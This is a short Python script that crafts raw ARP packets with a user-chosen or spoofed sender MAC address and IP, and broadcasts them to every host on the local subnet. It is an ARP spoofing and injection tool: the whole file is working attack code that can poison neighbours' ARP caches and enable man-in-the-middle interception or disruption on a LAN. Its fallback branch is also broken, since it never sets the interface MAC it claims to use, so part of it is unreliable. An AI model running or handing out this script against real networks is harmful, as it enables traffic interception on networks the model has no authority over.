import socket
import binascii
import struct
import netifaces as ni
import netaddr
import random


def notation(netmask):
    binary_str = ''
    for octet in netmask:
        binary_str += bin(int(octet))[2:].zfill(8)
    return str(len(binary_str.rstrip('0')))


dev = input("Enter interface name to inject ARP:: ")

# MAC Addr choose
mac = input("\nEnter the target MAC-Addr in 00:11:22:33:44:55 format\n\
or just press enter to bind packet with your own MAC-Addr = ")

# bind socket to the interface
# raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
raw.bind((dev, socket.htons(0x0800)))

# get ip address, netmask and MAC-addr of interface
ipaddr = ni.ifaddresses(dev)[2][0]['addr']
netmask = ni.ifaddresses(dev)[2][0]['netmask']

if len(mac) == 17:
    source_mac_address = mac
else:
    print("\nillegal MAC format, binding with interface MAC :P\n")

source_mac_address_hex = binascii.unhexlify(source_mac_address.replace(':', ''))

netID = ipaddr + '/' + notation(netmask.split('.'))

# list of network range
net_range = list(netaddr.IPNetwork(netID))

# remove networkID and Broadcast Address from list
del net_range[0]
net_range.pop()

if source_mac_address == mac:
    ip_input = input("Enter target IP or press return to choose at random : ")
    if ip_input == '':
        ip_random = random.sample(net_range, 1)
        ipaddr = str(ip_random[0])
    else:
        ipaddr = ip_input

s_ipaddr = ipaddr.split('.')
net_range.pop(int(s_ipaddr[3]))

source_ip_address = socket.inet_aton(ipaddr)

print("Injecting ARP packets with %s MAC, target IP %s on %s interface\n" % (source_mac_address, ipaddr, dev))

for i in net_range:
    destination_ip_address = socket.inet_aton(str(i))
    packet = struct.pack("!6s6s2s2s2s1s1s2s6s4s6s4s", b"\xff\xff\xff\xff\xff\xff", \
                         source_mac_address_hex, b"\x08\x06", b"\x00\x01", b"\x08\x00", b"\x06", b"\x04", \
                         b"\x00\x01", source_mac_address_hex, source_ip_address, b"\x00\x00\x00\x00\x00\x00",
                         destination_ip_address)
    raw.send(packet)
    raw.settimeout(5)
    print("current IP = " + str(i))
    print(raw.recvfrom(2048))
    raw.settimeout(None)
